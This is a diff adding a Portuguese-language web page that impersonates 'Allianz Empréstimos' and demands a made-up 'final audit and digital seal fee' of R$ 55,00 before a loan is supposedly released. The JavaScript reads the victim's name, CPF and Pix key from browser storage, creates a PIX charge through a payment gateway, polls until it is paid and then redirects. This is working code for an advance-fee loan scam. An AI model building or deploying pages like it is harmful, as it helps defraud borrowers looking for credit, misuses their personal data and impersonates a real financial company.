@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head><!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-59CWZV26');</script>
+<!-- End Google Tag Manager -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Allianz Empréstimos — Etapa Final</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+  <style>
+    :root { --brand-color: #002D72; --brand-light: #004a9d; --bg-gray: #f4f4f4; }
+    body { background: var(--bg-gray); font-family: Inter, sans-serif; color: #333; }
+    .brand-header { background: #fff; border-bottom: 4px solid var(--brand-color); padding: 1rem; text-align: center; }
+    .card { background: #fff; border-radius: 12px; border: 1px solid #ddd; padding: 2rem; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+    .btn-allianz { background: var(--brand-color); color: #fff; border-radius: 8px; padding: 1rem; font-weight: 700; width: 100%; transition: 0.3s; cursor: pointer; border: none; font-size: 15px; }
+    .btn-allianz:hover { background: var(--brand-light); }
+    .btn-allianz:disabled { opacity: 0.6; cursor: not-allowed; }
+    .spinner { display: inline-block; width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.4); border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; vertical-align: middle; margin-right: 8px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .status-bar { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 14px; background: #f8fafc; border-radius: 12px; margin-top: 16px; border: 1px solid #e2e8f0; }
+    .status-spinner { width: 18px; height: 18px; border: 2px solid #e2e8f0; border-top-color: var(--brand-color); border-radius: 50%; animation: spin 0.8s linear infinite; flex-shrink: 0; }
+    .hidden { display: none !important; }
+  </style>
+</head>
+<body>
+  <header class="brand-header">
+    <div class="text-2xl font-black text-[var(--brand-color)]">ALLIANZ <span class="font-light">EMPRÉSTIMOS</span></div>
+  </header>
+
+  <main class="max-w-3xl mx-auto px-4 py-10">
+    <section class="card">
+      <h1 class="text-xl font-black text-[var(--brand-color)] uppercase mb-4">Etapa Final de Liberação</h1>
+
+      <div class="bg-blue-50 p-4 border-l-4 border-[var(--brand-color)] mb-6">
+        <h2 class="font-bold text-[var(--brand-color)]">Aviso: Última Taxa Obrigatória</h2>
+        <p class="text-sm mt-2 text-gray-700 leading-relaxed">
+          Identificamos que seu contrato está pronto para transferência. Para finalizar o processo, é necessário realizar o pagamento da <strong>Taxa Final de Auditoria e Selo Digital</strong>. Esta é a <strong>última taxa</strong> exigida pelo nosso sistema para a validação do selo de autenticidade bancária.
+        </p>
+        <div class="mt-4">
+          <span class="text-sm font-bold">Valor Total Final:</span>
+          <span class="text-3xl font-black text-[var(--brand-color)] block mt-1">R$ 55,00</span>
+        </div>
+      </div>
+
+      <button id="btn-pay" class="btn-allianz">
+        <span id="btn-text">GERAR PIX PARA FINALIZAÇÃO</span>
+      </button>
+
+      <div id="pix-section" class="mt-8 border-2 border-dashed border-[var(--brand-color)] p-6 rounded-xl hidden text-center">
+        <h3 class="font-bold text-[var(--brand-color)] mb-4">Código Pix Gerado</h3>
+        <div id="qr-wrap" class="my-4 flex justify-center"></div>
+        <div id="pix-code" class="bg-gray-100 p-3 text-xs break-all font-mono border border-gray-200 select-all"></div>
+        <button id="btn-copy" class="mt-4 px-6 py-2 bg-[var(--brand-color)] text-white text-sm font-bold rounded-lg">Copiar código PIX</button>
+        <div id="status-pending" class="status-bar mt-4">
+          <div class="status-spinner"></div>
+          <span class="text-sm text-gray-500 font-medium">Aguardando pagamento...</span>
+        </div>
+        <div id="status-success" class="hidden mt-4 bg-green-100 text-green-800 p-4 rounded-xl font-semibold">✓ Pagamento confirmado! Redirecionando...</div>
+        <p class="text-[10px] text-gray-500 mt-4">Após esta etapa, o crédito será creditado automaticamente na conta cadastrada.</p>
+      </div>
+
+      <div id="pix-error" class="hidden mt-4 bg-red-50 text-red-700 p-4 rounded-xl text-sm font-medium"></div>
+    </section>
+  </main>
+
+  <footer class="text-center py-10 text-gray-400 text-xs">
+    © 2026 Allianz Empréstimos. Instituição financeira certificada.
+  </footer>
+
+  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+  <script src="config.js"></script>
+  <script>
+    const AMOUNT_STR = '55,00';
+    const NEXT_PAGE = '/pay/sucesso.html';
+
+    const btnPay = document.getElementById('btn-pay');
+    const btnText = document.getElementById('btn-text');
+    const pixSection = document.getElementById('pix-section');
+    const pixCodeEl = document.getElementById('pix-code');
+    const btnCopy = document.getElementById('btn-copy');
+    const statusPending = document.getElementById('status-pending');
+    const statusSuccess = document.getElementById('status-success');
+    const pixError = document.getElementById('pix-error');
+    const qrWrap = document.getElementById('qr-wrap');
+
+    let currentTxId = null;
+    let pollingInterval = null;
+    let paymentHandled = false;
+
+    function amountToCents(s) { return Math.round(parseFloat(s.replace(/[^\d,\.]/g,'').replace(',','.')) * 100); }
+
+    async function generatePixBynet(config, customer, cents, productName, externalRef) {
+      const c = config.gateways.bynet;
+      const addr = { street: 'Rua Principal', streetNumber: '1', complement: '', zipCode: '01001000', neighborhood: 'Centro', city: 'Sao Paulo', state: 'SP', country: 'BR' };
+      const body = { amount: cents, paymentMethod: 'PIX', customer: { name: customer.name, email: customer.email, document: { number: customer.cpf, type: 'CPF' }, phone: customer.phone, externalRef: customer.cpf + '-' + Date.now(), address: addr }, shipping: { fee: 0, address: addr }, items: [{ title: productName, unitPrice: cents, quantity: 1, tangible: false, externalRef: externalRef }], pix: { expiresInDays: 1 }, metadata: getUtmMetadata() };
+      const res = await fetch(`${API_BASES.bynet}/api/user/transactions`, { method: 'POST', headers: { 'x-api-key': c.api_key, 'User-Agent': 'AtivoB2B/1.0', 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
+      if (!res.ok) throw new Error(`Bynet ${res.status}`);
+      const data = await res.json();
+      const txData = data.data;
+      return { pixCopyPaste: txData?.pix?.qrcode || txData?.qrCode || null, txId: txData?.id || null };
+    }
+
+    async function generatePix() {
+      const config = (typeof GLOBAL_CONFIG !== 'undefined') ? GLOBAL_CONFIG : null;
+      if (!config?.activeGateway) { showError('Gateway não configurado.'); return; }
+
+      const nome = localStorage.getItem('nomeUsuario') || 'CLIENTE';
+      const cpfRaw = (localStorage.getItem('cpfUsuario') || '').replace(/\D/g,'');
+      const pixChaveRaw = localStorage.getItem('pixChave') || '';
+      const phoneClean = pixChaveRaw.replace(/\D/g,'');
+      const isEmailChave = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(pixChaveRaw);
+      const phone = !isEmailChave && phoneClean.length >= 10 ? phoneClean : '11999999999';
+      const customer = { name: nome, email: isEmailChave ? pixChaveRaw : 'user' + cpfRaw + '@CredPix.com.br', cpf: cpfRaw, phone: phone };
+      const cents = amountToCents(AMOUNT_STR);
+      const product = 'Taxa Final de Auditoria e Selo Digital';
+
+      btnPay.disabled = true;
+      btnText.innerHTML = '<span class="spinner"></span>Gerando PIX...';
+      pixError.classList.add('hidden');
+
+      try {
+        const result = await generatePixBynet(config, customer, cents, product, 'up3');
+        currentTxId = result.txId;
+        localStorage.setItem('txId_up3', currentTxId || '');
+
+        pixCodeEl.textContent = result.pixCopyPaste || '';
+        qrWrap.innerHTML = '';
+        if (result.pixCopyPaste) {
+          try { new QRCode(qrWrap, { text: result.pixCopyPaste, width:192, height:192, colorDark:"#000", colorLight:"#fff", correctLevel: QRCode.CorrectLevel.M }); }
+          catch(e) { qrWrap.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=192x192&data=${encodeURIComponent(result.pixCopyPaste)}" style="width:192px;height:192px;">`; }
+        }
+
+        btnPay.classList.add('hidden');
+        pixSection.classList.remove('hidden');
+        if (currentTxId) startPolling(config);
+
+      } catch(err) {
+        console.error(err);
+        showError('Falha ao gerar PIX: ' + (err.message || 'Tente novamente.'));
+        btnPay.disabled = false;
+        btnText.textContent = 'GERAR PIX PARA FINALIZAÇÃO';
+      }
+    }
+
+    async function checkStatusBynet(config) {
+      if (!currentTxId) return false;
+      try {
+        const c = config.gateways.bynet;
+        const res = await fetch(`${API_BASES.bynet}/api/user/transactions/${currentTxId}`, { headers: { 'x-api-key': c.api_key, 'User-Agent': 'AtivoB2B/1.0' } });
+        if (!res.ok) return false;
+        const data = await res.json();
+        return data?.data?.status === 'PAID';
+      } catch(e) { return false; }
+    }
+
+    function startPolling(config) {
+      pollingInterval = setInterval(async () => {
+        if (paymentHandled) return;
+        if (await checkStatusBynet(config)) {
+          paymentHandled = true;
+          clearInterval(pollingInterval);
+          statusPending.classList.add('hidden');
+          statusSuccess.classList.remove('hidden');
+          setTimeout(() => { window.location.href = NEXT_PAGE; }, 2000);
+        }
+      }, 5000);
+    }
+
+    function showError(msg) {
+      pixError.textContent = msg;
+      pixError.classList.remove('hidden');
+    }
+
+    btnPay.addEventListener('click', generatePix);
+
+    btnCopy.addEventListener('click', () => {
+      const text = pixCodeEl.textContent;
+      if (!text) return;
+      navigator.clipboard?.writeText(text).catch(()=>{});
+      btnCopy.textContent = '✓ Copiado!';
+      setTimeout(() => { btnCopy.textContent = 'Copiar código PIX'; }, 2000);
+    });
+  </script><!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-59CWZV26"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+</body>
+</html>
